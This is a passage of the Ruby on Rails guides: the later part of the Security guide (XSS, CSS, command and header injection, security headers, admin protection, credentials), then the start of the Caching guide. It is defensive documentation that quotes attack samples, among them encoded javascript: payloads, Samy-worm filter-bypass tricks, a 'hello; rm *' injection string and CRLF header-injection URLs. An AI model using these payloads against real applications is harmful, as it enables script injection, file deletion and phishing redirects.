This returned `"some<script>alert('hello')</script>"`, which makes an attack work. That's why a permitted list approach is better, using the updated Rails 2 method `sanitize()`:

```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.

Both Action View and Action Text build their [sanitization helpers](https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html) on top of the [rails-html-sanitizer](https://github.com/rails/rails-html-sanitizer) gem.

As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `html_escape()` (or its alias `h()`) method_ to replace the HTML input characters `&`, `"`, `<`, and `>` by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt;`, and `&gt;`).

##### Obfuscation and Encoding Injection

Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

This example pops up a message box. It will be recognized by the above `sanitize()` filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/). Rails' `sanitize()` method does a good job to fend off encoding attacks.

#### Examples from the Underground

_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._

The following is an excerpt from the [Js.Yamanner@m Yahoo! Mail worm](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa). It appeared on June 11, 2006 and was the first webmail interface worm:

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

The worms exploit a hole in Yahoo's HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why restricted list filters are never complete and why it is hard to allow HTML/JavaScript in a web application.

Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

In December 2006, 34,000 actual usernames and passwords were stolen in a [MySpace phishing attack](https://www.schneier.com/essays/archives/2006/12/myspace_passwords_ar.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS were used to hide the genuine MySpace content from the page and instead display its own login form.

### CSS Injection

INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari, and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._

CSS Injection is explained best by the well-known [MySpace Samy worm](https://samy.pl/myspace/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.

MySpace blocked many tags, but allowed CSS. So the worm's author put JavaScript into CSS like this:

```html
<div style="background:url('javascript:alert(1)')">
```

So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy `eval()` function which executes any string as code.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

The `eval()` function is a nightmare for restricted list input filters, as it allows the style attribute to hide the word "innerHTML":

```js
alert(eval('document.body.inne' + 'rHTML'));
```

The next problem was MySpace filtering the word `"javascript"`, so the author used `"java<NEWLINE>script"` to get around this:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

Another problem for the worm's author was the [CSRF security tokens](#cross-site-request-forgery-csrf). Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.

In the end, he got a 4 KB worm, which he injected into his profile page.

The [moz-binding](https://securiteam.com/securitynews/5LP051FHPE) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).

#### Countermeasures

This example, again, showed that a restricted list filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good permitted CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a permitted CSS filter, if you really need one.

### Textile Injection

If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](https://github.com/jgarber/redcloth) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.

For example, RedCloth translates `_test_` to `<em>test<em>`, which makes the
text italic. However, RedCloth doesn’t filter unsafe html tags by default:

```ruby
RedCloth.new("<script>alert(1)</script>").to_html
# => "<script>alert(1)</script>"
```

Use the `:filter_html` option to remove HTML which was not created by the Textile processor.

```ruby
RedCloth.new("<script>alert(1)</script>", [:filter_html]).to_html
# => "alert(1)"
```

However, this does not filter all HTML, a few tags will be left (by design), for example `<a>`:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Countermeasures

It is recommended to _use RedCloth in combination with a permitted input filter_, as described in the countermeasures against XSS section.

### Ajax Injection

NOTE: _The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._

If you use the [in_place_editor plugin](https://rubygems.org/gems/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the `h()` method.

### Command Line Injection

NOTE: _Use user-supplied command line parameters with caution._

If your application has to execute commands in the underlying operating system, there are several methods in Ruby: `system(command)`, `exec(command)`, `spawn(command)` and `` `command` ``. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (`;`) or a vertical bar (`|`).

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# prints "hello", and deletes files in the current directory
```

A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.

```ruby
system("/bin/echo", "hello; rm *")
# prints "hello; rm *" and does not delete files
```

#### Kernel#open's Vulnerability

`Kernel#open` executes OS command if the argument starts with a vertical bar (`|`).

```ruby
open("| ls") { |file| file.read }
# returns file list as a String via `ls` command
```

Countermeasures are to use `File.open`, `IO.open` or `URI#open` instead. They don't execute an OS command.

```ruby
File.open("| ls") { |file| file.read }
# doesn't execute `ls` command, just opens `| ls` file if it exists

IO.open(0) { |file| file.read }
# opens stdin. doesn't accept a String as the argument

require "open-uri"
URI("https://example.com").open { |file| file.read }
# opens the URI. `URI()` doesn't accept `| ls`
```

### Header Injection

WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS, or HTTP response splitting._

HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie, and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.

Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:

```ruby
redirect_to params[:referer]
```

What happens is that Rails puts the string into the `Location` header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

Note that `%0d%0a` is URL-encoded for `\r\n` which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.

```http
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._

#### DNS Rebinding and Host Header Attacks

DNS rebinding is a method of manipulating resolution of domain names that is commonly used as a form of computer attack. DNS rebinding circumvents the same-origin policy by abusing the Domain Name System (DNS) instead. It rebinds a domain to a different IP address and then compromises the system by executing random code against your Rails app from the changed IP address.

It is recommended to use the `ActionDispatch::HostAuthorization` middleware to guard against DNS rebinding and other Host header attacks. It is enabled by default in the development environment, you have to activate it in production and other environments by setting the list of allowed hosts. You can also configure exceptions and set your own response app.

```ruby
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # Exclude requests for the /healthcheck/ path from host checking
  exclude: ->(request) { request.path.include?("healthcheck") },
  # Add custom Rack application for the response
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}
```

You can read more about it in the [`ActionDispatch::HostAuthorization` middleware documentation](/configuring.html#actiondispatch-hostauthorization)

#### Response Splitting

If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

```http
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._

Unsafe Query Generation
-----------------------

Due to the way Active Record interprets parameters in combination with the way
that Rack parses query parameters it was possible to issue unexpected database
queries with `IS NULL` where clauses. As a response to that security issue
([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ),
[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ)
and [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ))
`deep_munge` method was introduced as a solution to keep Rails secure by default.

Example of vulnerable code that could be used by attacker, if `deep_munge`
wasn't performed is:

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

When `params[:token]` is one of: `[nil]`, `[nil, nil, ...]` or
`['foo', nil]` it will bypass the test for `nil`, but `IS NULL` or
`IN ('foo', NULL)` where clauses still will be added to the SQL query.

To keep Rails secure by default, `deep_munge` replaces some of the values with
`nil`. Below table shows what the parameters look like based on `JSON` sent in
request:

| JSON                              | Parameters               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

It is possible to return to old behavior and disable `deep_munge` configuring
your application if you are aware of the risk and know how to handle it:

```ruby
config.action_dispatch.perform_deep_munge = false
```

HTTP Security Headers
---------------------

To improve the security of your application, Rails can be configured to return
HTTP security headers. Some headers are configured by default; others need to
be explicitly configured.

### Default Security Headers

By default Rails is configured to return the following response headers. Your
application returns these headers for every HTTP response.

#### `X-Frame-Options`

The [`X-Frame-Options`][] header indicates if a browser can render the page in a `<frame>`,
`<iframe>`, `<embed>` or `<object>` tag. This header is set to `SAMEORIGIN` by
default to allow framing on the same domain only. Set it to `DENY` to deny
framing at all, or remove this header completely if you want to allow framing on
all domains.

[`X-Frame-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

#### `X-Content-Type-Options`

The [`X-Content-Type-Options`][] header is set to `nosniff` in Rails by default.
It stops the browser from guessing the MIME type of a file.

[`X-Content-Type-Options`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options

#### `X-Permitted-Cross-Domain-Policies`

This header is set to `none` in Rails by default. It disallows Adobe Flash and
PDF clients from embedding your page on other domains.

#### `Referrer-Policy`

The [`Referrer-Policy`][] header is set to `strict-origin-when-cross-origin` in Rails by default.
For cross-origin requests, this only sends the origin in the Referer header. This
prevents leaks of private data that may be accessible from other parts of the
full URL, such as the path and query string.

[`Referrer-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy

#### Configuring the Default Headers

These headers are configured by default as follows:

```ruby
config.action_dispatch.default_headers = {
  "X-Frame-Options" => "SAMEORIGIN",
  "X-Content-Type-Options" => "nosniff",
  "X-Permitted-Cross-Domain-Policies" => "none",
  "Referrer-Policy" => "strict-origin-when-cross-origin"
}
```

You can override these or add extra headers in `config/application.rb`:

```ruby
config.action_dispatch.default_headers["X-Frame-Options"] = "DENY"
config.action_dispatch.default_headers["Header-Name"]     = "Value"
```

Or you can remove them:

```ruby
config.action_dispatch.default_headers.clear
```

### `Strict-Transport-Security` Header

The HTTP [`Strict-Transport-Security`][] (HSTS) response header makes sure the
browser automatically upgrades to HTTPS for current and future connections.

The header is added to the response when enabling the `force_ssl` option:

```ruby
config.force_ssl = true
```

[`Strict-Transport-Security`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security

### `Content-Security-Policy` Header

To help protect against XSS and injection attacks, it is recommended to define a
[`Content-Security-Policy`][] response header for your application. Rails
provides a DSL that allows you to configure the header.

Define the security policy in the appropriate initializer:

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # Specify URI for violation reports
  policy.report_uri "/csp-violation-report-endpoint"
end
```

The globally configured policy can be overridden on a per-resource basis:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

Or it can be disabled:

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

Use lambdas to inject per-request values, such as account subdomains in a
multi-tenant application:

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

[`Content-Security-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy

#### Reporting Violations

Enable the [`report-uri`][] directive to report violations to the specified URI:

```ruby
Rails.application.config.content_security_policy do |policy|
  policy.report_uri "/csp-violation-report-endpoint"
end
```

When migrating legacy content, you might want to report violations without
enforcing the policy. Set the [`Content-Security-Policy-Report-Only`][]
response header to only report violations:

```ruby
Rails.application.config.content_security_policy_report_only = true
```

Or override it in a controller:

```ruby
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
[`report-uri`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri

#### Adding a Nonce

If you are considering `'unsafe-inline'`, consider using nonces instead. [Nonces
provide a substantial improvement](https://www.w3.org/TR/CSP3/#security-nonces)
over `'unsafe-inline'` when implementing a Content Security Policy on top
of existing code.

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

There are a few tradeoffs to consider when configuring the nonce generator.
Using `SecureRandom.base64(16)` is a good default value, because it will
generate a new random nonce for each request. However, this method is
incompatible with [conditional GET caching](caching_with_rails.html#conditional-gets)
because new nonces will result in new ETag values for every request. An
alternative to per-request random nonces would be to use the session id:

```ruby
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
```

This generation method is compatible with ETags, however its security depends on
the session id being sufficiently random and not being exposed in insecure
cookies.

By default, nonces will be applied to `script-src` and `style-src` if a nonce
generator is defined. `config.content_security_policy_nonce_directives` can be
used to change which directives will use nonces:

```ruby
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
```

Once nonce generation is configured in an initializer, automatic nonce values
can be added to script tags by passing `nonce: true` as part of `html_options`:

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>
```

The same works with `javascript_include_tag` and the `stylesheet_link_tag`:

```html+erb
<%= javascript_include_tag "script", nonce: true %>
<%= stylesheet_link_tag "style.css", nonce: true %>
```

To automatically attach a nonce to `javascript_tag`, `javascript_include_tag`, and
`stylesheet_link_tag` if the corresponding directives are specified in `config.content_security_policy_nonce_directives`,
you can set `config.content_security_policy_nonce_auto` to `true`:

```ruby
Rails.application.config.content_security_policy_nonce_auto = true
```

This is especially useful for 3rd-party views when using nonce-based source expressions
in your Content Security Policy.

NOTE: Be mindful of caching. Since the nonce is typically generated per request,
enabling this may lead to cache fragmentation or stale content if your caching strategy
doesn't account for dynamic nonces.

Use [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
helper to create a meta tag "csp-nonce" with the per-session nonce value
for allowing inline `<script>` tags.

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

This is used by the Rails UJS helper to create dynamically
loaded inline `<script>` elements.

### `Feature-Policy` Header

NOTE: The `Feature-Policy` header has been renamed to `Permissions-Policy`.
The `Permissions-Policy` requires a different implementation and isn't
yet supported by all browsers. To avoid having to rename this
middleware in the future, we use the new name for the middleware but
keep the old header name and implementation for now.

To allow or block the use of browser features, you can define a [`Feature-Policy`][]
response header for your application. Rails provides a DSL that allows you to
configure the header.

Define the policy in the appropriate initializer:

```ruby
# config/initializers/permissions_policy.rb
Rails.application.config.permissions_policy do |policy|
  policy.camera      :none
  policy.gyroscope   :none
  policy.microphone  :none
  policy.usb         :none
  policy.fullscreen  :self
  policy.payment     :self, "https://secure.example.com"
end
```

The globally configured policy can be overridden on a per-resource basis:

```ruby
class PagesController < ApplicationController
  permissions_policy do |policy|
    policy.geolocation "https://example.com"
  end
end
```

[`Feature-Policy`]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy

### Cross-Origin Resource Sharing

Browsers restrict cross-origin HTTP requests initiated from scripts. If you
want to run Rails as an API, and run a frontend app on a separate domain, you
need to enable [Cross-Origin Resource
Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (CORS).

You can use the [Rack CORS](https://github.com/cyu/rack-cors) middleware for
handling CORS. If you've generated your application with the `--api` option,
Rack CORS has probably already been configured and you can skip the following
steps.

To get started, add the rack-cors gem to your Gemfile:

```ruby
gem "rack-cors"
```

Next, add an initializer to configure the middleware:

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, Rack::Cors do
  allow do
    origins "example.com"

    resource "*",
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options, :head]
  end
end
```

Intranet and Admin Security
---------------------------

Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.

In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" website of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF.

### Cross-Site Scripting

If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.

Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.

Refer to the Injection section for countermeasures against XSS.

### Cross-Site Request Forgery

Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.

A real-world example is a router reconfiguration by CSRF. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for the user, but it also contained an image tag that resulted in an HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake website and had their credentials stolen.

Another example changed Google Adsense's e-mail address and password. If the victim was logged into Google Adsense, the administration interface for Google advertisement campaigns, an attacker could change the credentials of the victim.

Another popular attack is to spam your web application, your blog, or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.

For _countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.

### Additional Precautions

The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:

* It is very important to _think about the worst case_: What if someone really got hold of your cookies or user credentials. You could _introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _special password for very serious actions_?

* Does the admin really have to access the interface from everywhere in the world? Think about _limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.

* _Put the admin interface to a special subdomain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.

Environmental Security
----------------------

It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. `config/database.yml`, master key for `credentials.yml`, and other unencrypted secrets. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.

### Custom Credentials

Rails stores secrets in `config/credentials.yml.enc`, which is encrypted and hence cannot be edited directly. Rails uses `config/master.key` or alternatively looks for the environment variable `ENV["RAILS_MASTER_KEY"]` to encrypt the credentials file. Because the credentials file is encrypted, it can be stored in version control, as long as the master key is kept safe.

By default, the credentials file contains the application's
`secret_key_base`. It can also be used to store other secrets such as access keys for external APIs.

To edit the credentials file, run `bin/rails credentials:edit`. This command will create the credentials file if it does not exist. Additionally, this command will create `config/master.key` if no master key is defined.

Secrets kept in the credentials file are accessible via `Rails.application.credentials`.
For example, with the following decrypted `config/credentials.yml.enc`:

```yaml
secret_key_base: 3b7cd72...
some_api_key: SOMEKEY
system:
  access_key_id: 1234AB
```

`Rails.application.credentials.some_api_key` returns `"SOMEKEY"`. `Rails.application.credentials.system.access_key_id` returns `"1234AB"`.

If you want an exception to be raised when some key is blank, you can use the bang
version:

```ruby
# When some_api_key is blank...
Rails.application.credentials.some_api_key! # => KeyError: :some_api_key is blank
```

TIP: Learn more about credentials with `bin/rails credentials:help`.

WARNING: Keep your master key safe. Do not commit your master key.

Dependency Management and CVEs
------------------------------

We don’t bump dependencies just to encourage use of new versions, including for security issues. This is because application owners need to manually update their gems regardless of our efforts. Use `bundle update --conservative gem_name` to safely update vulnerable dependencies.

Additional Resources
--------------------

The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:

* Subscribe to the Rails security [mailing list](https://discuss.rubyonrails.org/c/security-announcements/9).
* [Mozilla's Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security.html) - Recommendations on topics covering Content Security Policy, HTTP headers, Cookies, TLS configuration, etc.
* A [good set of security resources](https://owasp.org/), notably the [Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html), with for example the [Cross-Site Scripting Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).


<!-- ===== guides/source/caching_with_rails.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Caching with Rails
==================

This guide is an introduction to speeding up your Rails application with
caching.

After reading this guide, you will know:

* What caching is.
* The types of caching strategies.
* How to manage cache dependencies.
* How to configure Solid Cache and other cache stores.

--------------------------------------------------------------------------------

What is Caching?
----------------

Caching means storing content generated during the request-response cycle and
reusing it when responding to similar requests. It avoids doing an expensive
operation more than once - think of it like saving the result of something
expensive so you can look it up later instead of recomputing it.

Caching is one of the most effective ways to boost an application's performance.
It allows websites running on modest infrastructure, a single server with a
single database, to sustain thousands of concurrent users.

Rails provides a set of caching features out of the box which allows you to not
only cache data, but also to tackle challenges like cache expiration, cache
dependencies, and cache invalidation.


Setup
-----

By default, [Action Controller
Caching](https://api.rubyonrails.org/classes/ActionController/Caching.html) is
enabled only in the production environment. However, you can play around with
caching locally by running `bin/rails dev:cache`, or by setting
[`config.action_controller.perform_caching`][] to `true` in
`config/environments/development.rb`.

```bash
$ bin/rails dev:cache
Development mode is now being cached.
$ bin/rails dev:cache
Development mode is no longer being cached.
```

NOTE: Changing the value of `config.action_controller.perform_caching` only
affects caching provided by Action Controller. It will not impact [low-level
caching](#low-level-caching-using-rails-cache).

By default, new Rails applications use
[`:memory_store`](#activesupport-cache-memorystore) as the cache store in
development. If you want to use Solid Cache in development, set the
`cache_store` configuration in `config/environments/development.rb`:

```ruby
config.cache_store = :solid_cache_store
```

and make sure the `cache` database is configured, created, and migrated:

```yaml
development:
  primary:
    <<: *default
    database: storage/development.sqlite3
  cache:
    <<: *default
    database: storage/development_cache.sqlite3
    migrations_paths: db/cache_migrate
```

After configuring the database, run `bin/rails db:prepare` so the cache tables
are created.

TIP: To disable caching set `cache_store` to
[`:null_store`](#activesupport-cache-nullstore)

[`config.action_controller.perform_caching`]:
    configuring.html#config-action-controller-perform-caching

Types of Caching
----------------

Rails provides several different caching strategies to suit different needs and
use cases. Each approach has its own benefits and is useful in different
scenarios.

### Low-Level Caching using `Rails.cache`

Rails' low-level caching mechanism, accessed with `Rails.cache`, stores
serializable values such as API responses, computed values, and expensive query
results. This lets you cache individual pieces of data without caching an entire
view.

`Rails.cache.fetch` handles both _reading from_ and _writing to_ the cache. When
called with a single argument, it fetches and returns the cached value for the
given key. If a block is passed, the block is executed only on a cache miss. The
block's return value is written to the cache under the given cache key and
returned. In case of cache hit, the cached value is returned directly without
executing the block.

For example:

```ruby
# Fetch a value with a block to set a default if it doesn’t exist
welcome_message = Rails.cache.fetch("welcome_message") { "Welcome to Rails!" }
puts welcome_message # Output: Welcome to Rails!
```

INFO: A cache hit means Rails found an existing value in the cache and could
reuse it. A cache miss means the value was not in the cache yet, so Rails had to
generate it and store it. Cache misses are normal, especially when an entry
expires, the cache is cleared, or a key is used for the first time.

For more advanced use cases, `Rails.cache.fetch` also accepts options such as
`race_condition_ttl`, which can help prevent a cache stampede by briefly reusing
a recently expired entry while one process rebuilds it. The full set of options
is documented in
[`ActiveSupport::Cache::Store`](https://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html).

Alternatively, you can specify whether you want to read or write from the cache
using `Rails.cache.read` and `Rails.cache.write`. You can delete a key using
`Rails.cache.delete`.

```ruby
# Store a value in the cache
Rails.cache.write("greeting", "Hello, world!")

# Retrieve the value from the cache
greeting = Rails.cache.read("greeting")
puts greeting # Output: Hello, world!

# Fetch a value with a block to set a default if it doesn’t exist
welcome_message = Rails.cache.fetch("welcome_message") { "Welcome to Rails!" }
puts welcome_message # Output: Welcome to Rails!

# Delete a value from the cache
Rails.cache.delete("greeting")
```

If you need to remove everything from the current cache store, you can call
`Rails.cache.clear`. This is most useful in development or when you explicitly
want to reset the cache. In production, clearing the entire cache can cause a
sudden increase in work while entries are rebuilt.

You can use Hashes and Arrays of values as cache keys.

```ruby
# This is a valid cache key
Rails.cache.read(site: "mysite", owners: [owner_1, owner_2])
```

Cache keys can be any object that responds to `cache_key` or `to_param`. If you
need custom keys, you can implement `cache_key` on your own classes. Active
Record models already generate cache keys based on the model name and record ID.

Consider the following example. An application has a `Product` model with an
instance method that looks up the product's price on a competitor's website. The
data returned by this method would be a good fit for low-level caching:

```ruby
class Product < ApplicationRecord
  def competing_price
    Rails.cache.fetch("#{cache_key_with_version}/competing_price", expires_in: 12.hours) do
      Competitor::API.find_price(id)
    end
  end
end
```

Notice that in the example above we used the `cache_key_with_version` method, so
the resulting cache key will be something like
`products/233-20140225082222765838000/competing_price`. `cache_key_with_version`
generates a string based on the model's class name, `id`, and `updated_at`
attributes, in the form `<model class name>/<resource id>-<resource
updated_at>`. This is a common convention and has the benefit of invalidating
the cache whenever the product is updated.

INFO: The keys you use on `Rails.cache` will not be the same as those actually
